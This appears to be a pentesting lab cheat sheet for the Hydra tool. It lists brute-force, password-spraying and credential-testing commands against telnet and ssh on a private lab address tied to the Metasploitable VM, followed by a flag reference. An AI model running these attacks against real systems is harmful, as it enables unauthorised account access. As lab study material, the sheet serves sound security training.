Hydra:
    # Password brute-force (single username)
    hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -f -V telnet://192.168.56.101

    # Username brute-force (single password)
    hydra -L users.txt -p msfadmin -t 4 -f -V telnet://192.168.56.101

    # Test single credential pair
    hydra -l admin -p admin telnet://192.168.56.101

    # Full brute-force (multiple usernames and passwords)
    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f -V telnet://192.168.56.101

    # Password spraying (common password across many users)
    hydra -L users.txt -p Summer2024! -t 4 -f telnet://192.168.56.101

    # Specify custom port
    hydra -l admin -P passwords.txt -s 2222 ssh://192.168.56.101

    # Save results to file
    hydra -L users.txt -P passwords.txt -o hydra_results.txt telnet://192.168.56.101

    - Quick Reference:

    -l  : Single username
    -L  : Username wordlist
    -p  : Single password
    -P  : Password wordlist

    -t  : Number of parallel tasks (threads)
    -f  : Stop after first valid login per host
    -F  : Stop attack after first valid login globally

    -v  : Show login attempts
    -V  : Show detailed login attempts (recommended)

    -s  : Specify service port
    -o  : Output results to file
